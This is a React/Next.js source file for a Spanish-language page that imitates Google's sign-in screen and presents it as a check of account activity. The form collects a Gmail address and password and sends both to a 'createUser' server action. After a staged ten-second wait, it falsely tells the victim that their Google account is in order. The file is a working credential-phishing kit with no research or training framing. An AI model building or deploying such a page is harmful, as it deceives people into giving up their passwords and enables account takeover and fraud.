"use client"

import { useState } from 'react';
import { TextField, Typography, Box, Container } from '@mui/material';
import GoogleLogo from '../assets/Google Logo.png';
import '@fontsource/roboto/300.css';
import '@fontsource/roboto/400.css';
import '@fontsource/roboto/500.css';
import '@fontsource/roboto/700.css';
import wait from '../functions/wait';
import { LoadingButton } from '@mui/lab';
import CheckCircleOutlineIcon from '@mui/icons-material/CheckCircleOutline';
import { green } from '@mui/material/colors';
import ErrorIcon from '@mui/icons-material/Error';
import Image from 'next/image';
import createUser from '../actions/user';

function App() {

  const [isLoading, setIsLoading] = useState(false);
  const [showOkMsg, setShowOkMsg] = useState(false);
  const [inputData, setInputData] = useState({
    gmail: '',
    password: ''
  });
  const [validPassword, setValidPassword] = useState(true);
  const [validGmail, setValidGmail] = useState(true);
  const [showErrorMsg, setShowErrorMsg] = useState(false);


  function handleClick() {

    const regexEmail = new RegExp("^[a-zA-Z0-9._%+-]+@gmail\\.com$");

    // Realizar validación antes de actualizar los estados
    const isGmailValid = regexEmail.test(inputData.gmail);
    const isPasswordValid = inputData.password.length > 0;

    // Actualizar estados
    setValidGmail(isGmailValid);
    setValidPassword(isPasswordValid);

    if (!isGmailValid || !isPasswordValid) {
      setShowErrorMsg(true);
      return;
    }

    const f = async () => {
      setIsLoading(true);
      await wait(10000);
      setIsLoading(false);
      setShowOkMsg(true);
    }
    f();
  }

  async function handleSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    console.log("hola mundo submit")

    const formData = new FormData();  // Crear un nuevo objeto FormData
    formData.append('gmail', inputData.gmail);
    formData.append('password', inputData.password);
  
    handleClick();  // Continuar con tus validaciones y estado
    await createUser(formData);  // Pasar formData a la función createUser
  }

  function handleChange(e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) {
    const { name, value } = e.target;
    setInputData(data => ({
      ...data,
      [name]: value
    }));
  }

  if (showOkMsg) {
    return (
      <Container component="main" maxWidth="xs" sx={{
        height: '100vh',
        display: 'flex',
        flexDirection: 'column',
        justifyContent: 'center',
        alignItems: 'center',
        gap: 2
      }}>
        <Box
          sx={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            border: '1px solid #e0e0e0',
            borderRadius: 2,
            p: 3,
            width: '100%',
            paddingTop: '40px',
            paddingBottom: '100px'
          }}
        >
          <Box sx={{ mb: 2, textAlign: 'center', display: 'flex', justifyContent: 'center' }}>
            <Image src={GoogleLogo} alt="Google Logo" style={{ width: '50%', maxWidth: '92px' }} />
          </Box>
          <Typography component="h1" variant="h5" align="center" gutterBottom sx={{ fontSize: '1.4rem' }}>
            Tu cuenta de Google está en orden
          </Typography>
          <Typography variant="body2" align="center" sx={{ mb: 2, fontSize: '0.8rem' }}>
            Logramos verificar las actividades realizadas en tu cuenta de Google y concluimos que todo está bajo control
          </Typography>
          <CheckCircleOutlineIcon sx={{ marginTop: '1rem', fontSize: '6rem', fontWeight: 'light', color: green[400] }} />
        </Box>
        <Box sx={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'center', gap: 2 }}>
          <Typography variant="caption" color="text.secondary" sx={{ cursor: 'pointer' }}>
            Español (Latinoamérica)
          </Typography>
          <Typography variant="caption" color="text.secondary" sx={{ cursor: 'pointer' }}>
            Ayuda
          </Typography>
          <Typography variant="caption" color="text.secondary" sx={{ cursor: 'pointer' }}>
            Privacidad
          </Typography>
          <Typography variant="caption" color="text.secondary" sx={{ cursor: 'pointer' }}>
            Condiciones
          </Typography>
        </Box>
      </Container>
    );
  }

  return (
    <Container component="main" maxWidth="xs" sx={{
      height: '100vh',
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      gap: 2
    }}>
      <Box
        sx={{
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          border: '1px solid #e0e0e0',
          borderRadius: 2,
          p: 3,
          width: '100%',
          paddingTop: '40px',
          paddingBottom: '100px'
        }}
      >
        <Box sx={{ mb: 2, textAlign: 'center', display: 'flex', justifyContent: 'center' }}>
          <Image src={GoogleLogo} alt="Google Logo" style={{ width: '50%', maxWidth: '92px' }} />
        </Box>
        <Typography component="h1" variant="h5" align="center" gutterBottom>
          Accede a tu cuenta de Google
        </Typography>
        <Typography variant="body2" align="center" sx={{ mb: 2 }}>
          Ingresa tus datos para ingresar a tu cuenta de Google y verificar la actividad
        </Typography>
        <form onSubmit={handleSubmit}>
          <TextField
            variant="outlined"
            margin="normal"
            fullWidth
            label="Gmail"
            onChange={handleChange}
            name="gmail"
            error={!validGmail}
            autoComplete='username webauthn'       
            className='whsOnd zHQkBf'                 
          />
          <TextField
            variant="outlined"
            margin="normal"
            fullWidth
            label="Contraseña"
            type="password"
            onChange={handleChange}
            name="password"
            error={!validPassword}
            autoComplete='current-password'
          />
          {showErrorMsg &&
            <Box sx={{ display: 'flex', alignItems: 'center', gap: '2px' }}>
              <ErrorIcon color="error" sx={{ fontSize: '.8rem' }} />
              <Typography variant='subtitle2' color="error" sx={{ fontSize: '.8rem' }}>Verifica que los datos ingresados sean correctos</Typography>
            </Box>
          }
          <Box sx={{ mt: 2, display: 'flex', justifyContent: 'end' }}>
            <LoadingButton
              loading={isLoading}
              loadingPosition="center"
              variant="contained"
              color="primary"
              disableElevation sx={{ textTransform: 'capitalize' }}              
              type="submit"
            >
              Siguiente
            </LoadingButton>
          </Box>
        </form>
      </Box>
      <Box sx={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'center', gap: 2 }}>
        <Typography variant="caption" color="text.secondary" sx={{ cursor: 'pointer' }}>
          Español (Latinoamérica)
        </Typography>
        <Typography variant="caption" color="text.secondary" sx={{ cursor: 'pointer' }}>
          Ayuda
        </Typography>
        <Typography variant="caption" color="text.secondary" sx={{ cursor: 'pointer' }}>
          Privacidad
        </Typography>
        <Typography variant="caption" color="text.secondary" sx={{ cursor: 'pointer' }}>
          Condiciones
        </Typography>
      </Box>
    </Container>
  );
}

export default App;